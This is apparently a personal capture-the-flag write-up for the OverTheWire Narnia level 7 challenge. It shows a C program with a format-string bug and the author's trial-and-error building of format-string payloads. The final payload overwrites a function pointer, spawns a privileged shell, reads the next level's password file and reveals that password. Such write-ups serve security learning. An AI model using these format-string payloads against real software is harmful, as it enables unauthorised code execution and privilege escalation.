# **Let's get this bread**
----------------------------
Let's first check out our code before doing anything

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

### What's all that bulls\*\*t???
Alright so i need to change the command call from the goodFunction to the HackedOne! The logic is quite easy but how am i supposed to do that??

First I do get a lot of informations about all my try whenever i'm trying through the vuln func, so pretty cool thx u :)

Basically it assign to the "ptrf" call the good function, but we do want to change this data to introduce our hackedOne
All the time I do the same thing --> first compare the attacks you know with the code and look if they are vulnerabilities that shows up, and here I point out a Format String Attack.
We've already use this one before so it could be pretty easy! (I hope)

First here is the OWASP page about this attack *(realllllly useful to understand and use it properly)*
	-[Owasp](https://owasp.org/www-community/attacks/Format_string_attack)
So why do I have a vulnerability to this kind of attack??
Basically look at this line:

```c
snprintf(buffer, sizeof buffer, format); //Remember that we should normally use the %s to get protected to this attack
```

So we do have an idea on how to attack it, let's gather some informations!!



## The theory part, or the "too much things to read part" !!

Ok so let's dig down a bit, after checking owasp, I found out that I haven't enough information to do this attack so I turned to some other ressources. And here is one amazing resources you can use: *"Grey Hat Hacking"*, the books are just amazing and full of informations !!!
	-[Third Edition of this Book in txt](https://archive.org/stream/GrayHatHackingThirdEdition/Gray+Hat+Hacking%2C+Third+Edition_djvu.txt)
	-[More Interactive and Readable version ..but there is a lot of annoying pop up..](https://apprize.best/security/ethical_1/12.html)

Yes it is in txt, because with a ctrl-f you can get you're informations way quicker even if it's goddamn ugly
Let's search for format string and then we find about a table 12-2!! Ok apparently it permits us to calcul the text we need to send to exploit this Format String Attack properly. So we can "encode" the address of the hackedFunc and send it (we'll do that later). But where will i send it?


## which data should i use?

Effectively we actually have nothing to work with and that's a shitty thing.
Let's look at the table:
![Table 12-2](https://apprize.best/security/ethical_1/ethical_1.files/image385.jpg)

We do need:
	-An address
	-An HOB and a LOB (basically the hackedFunc splitted in to part)
	-and the Offset!

So let's rerun narnia7 with some random data --> we got those results:

```bash
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd658)
I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..
```

Let's keep the "cool and useful" datas:
	-HOB & LOB are determined from 0x8048724 --> HOB=0x0804 & LOB=0x8724
	-the return adress --> picked from ptrf() --> addr=0xffffd658
	-the offset --> trickiest part, basically i'll run an ltrace, even if it is in reverse you just need to count from your last \x41 to the first word of your return address, 2-4-6 ALRIGHT WE HAVE 6 as offset
*snprintf("AAAA80486ff414141413834303834666"..., 128, "AAAA%x%x%x%x", 0x80486ff, 0x41414141, 0x38343038, 0x34666636) = 35,
if we have a closer look, from the last 41 of 0x41414141 and the ff from our function 0x80486ff (who's the good function) there is an offset of 6words*

so now we have everything to calculate the return stuff :)
So our HOB < LOB so let's follow this pattern:
addr+2	addr == 0xffffd660 0xffffd658 soit \x5a\xd6\xff\xff\x58\xd6\xff\xff 
HOB-8 == 7FC and then the to dec = 2044 and then the transformation --> %2044x
%offset$hn == %6$hn
LOB - HOB == 7F20 --> decimal = 32544 --> transformed == %32544x
offset+1 == 7 --> transformed == %7$hn

let's get it on one line: \x5a\xd6\xff\xff\x58\xd6\xff\xff %.2044x%6$hn%.32544x%7$hn
Alright so the python to exec should be: $(python -c'print("\x5a\xd6\xff\xff\x58\xd6\xff\xff%.2044x%6$hn%.32544x%7$hn")')

And when i try it, A seg fault, but i see that my address change from 0xffffd658 to 0xffffd638
SO let's just change our address value to our new value:
$(python -c'print("\x3a\xd6\xff\xff\x38\xd6\xff\xff%2044x%6$hn%32544x%7$hn")')




Honestly at this point, i was lost, the technique i was pretty sure that would have worked, doesn't seems to work at all and i was done lol.
I keep it like that for like 1w, and i've decided to try another technique
But i wanted to keep this technique here because I'm pretty sure in another situation it could help me so I'll keep it there



**IF ANYONE HAVE AN EXPLANATION ABOUT WHY IT DOESNT WORK PLS CONTACT ME!!!!**



# **The reborn**
---------------------------------- 

Ok so let's just keep it way simplier than all that stuff!!
Basically --> WHAT DO I WANT TO DO ? 
I want to place my hex call of the hackFunction to the pllace the program is supposed to call the right func
Basically i tried to put the hex of the address and just after the hex of the hackFunc
But what about the technique we used last time in narnia5 ?? Let's just convert the hex to dec and put it as a %size x and tell him to take a %1$n at the end
Let's do some convert !!
Alright so we take our hackdFunc 0x8048724 and let's just -4 because of the address we put first
convert all in dec --> 134514464, so we have addr%134514464x%1$n

Let's finally test this --> \x58\xd6\xff\xff%134514464d%1$hn
And .... Seg fault..., but the address changed so let's just change it:
\x48\xd6\xff\xff%134514464d%1$hn
AAAAAANNNND IT doesnt work ......
But as i remember a %n take half the size of an address so let's just change it to a double sized like so %2$hn
And it should work now!!

THANK GOOOOD IT WORKED

```bash
./narnia7 $(python -c 'print "\x48\xd6\xff\xff%134514464d%2$hn"')
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Way to go!!!!$ cat /etc/narnia_pass/narnia8
```

~~**mohthuphog**~~

let's have another coffee ~~i deserved it~~